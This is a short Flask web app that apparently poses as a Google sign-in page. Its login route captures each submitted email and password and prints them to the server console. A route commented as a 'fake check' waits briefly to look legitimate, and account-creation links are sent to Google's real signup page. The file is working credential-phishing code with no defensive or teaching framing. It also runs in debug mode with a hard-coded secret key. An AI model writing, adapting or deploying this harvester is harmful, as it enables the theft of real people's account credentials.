from flask import Flask, render_template, request, redirect, url_for
import time

app = Flask(__name__)
app.secret_key = 'supersecretkey'

@app.route('/')
def index():
    return render_template('password.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    print(f"{email} | {password}")
    return redirect(url_for('checking'))

@app.route('/checking')
def checking():
    time.sleep(2)  # Фейковая проверка
    return render_template('done.html')

@app.route('/create-account')
def create_account():
    return redirect("https://accounts.google.com/signup")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)